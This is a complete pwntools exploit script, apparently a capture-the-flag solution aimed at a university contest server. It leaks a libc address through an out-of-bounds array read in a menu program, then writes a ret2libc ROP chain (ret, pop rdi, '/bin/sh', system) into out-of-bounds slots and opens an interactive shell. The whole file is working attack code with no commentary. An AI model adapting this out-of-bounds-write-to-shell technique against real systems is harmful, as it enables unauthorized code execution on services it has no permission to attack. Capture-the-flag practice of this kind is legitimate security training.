from pwn import *

#r=process("./pwn")
r=remote("contest.ctf.nefu.edu.cn",33073)
#context.log_level='debug'
context.arch='amd64'
#gdb.attach(r)
pause()
r.recvuntil(b"\xbc\x9a")
r.sendline(b"1")

r.sendline(b"1")
r.sendline(b"2")
r.sendline(b"3")
r.sendline(b"4")
r.sendline(b"5")
r.sendline(b"6")
r.sendline(b"7")
r.sendline(b"8")
r.sendline(b"9")
r.sendline(b"10")
r.sendline(b"-1")

r.recvuntil(b"\xbc\x9a")
r.sendline(b"4")
r.recvuntil(b"\xbc\x9a")
r.sendline(b"13")

r.recvuntil(b"13")
r.recvuntil(b"\xbc\x9a")
libc_base=int(r.recvuntil(b"=")[:-1])-0x21C87
print(hex(libc_base))
libc=ELF("./libc-2.27.so")
rdi_add=0x2164f+libc_base
binsh_add=next(libc.search(b"/bin/sh"))+libc_base
sys_add=libc.sym["system"]+libc_base
ret_add=0x8aa+libc_base
r.recvuntil(b"\xbc\x9a")
r.sendline(b"2")
r.recvuntil(b"\xbc\x9a")
r.sendline(b"13")
r.recvuntil(b"\xbc\x9a")
r.sendline(str(ret_add))

r.recvuntil(b"\xbc\x9a")
r.sendline(b"2")
r.recvuntil(b"\xbc\x9a")
r.sendline(b"14")
r.recvuntil(b"\xbc\x9a")
r.sendline(str(rdi_add))


r.recvuntil(b"\xbc\x9a")
r.sendline(b"2")
r.recvuntil(b"\xbc\x9a")
r.sendline(b"15")
r.recvuntil(b"\xbc\x9a")
r.sendline(str(binsh_add))


r.recvuntil(b"\xbc\x9a")
r.sendline(b"2")
r.recvuntil(b"\xbc\x9a")
r.sendline(b"16")
r.recvuntil(b"\xbc\x9a")
r.sendline(str(sys_add))

r.interactive()
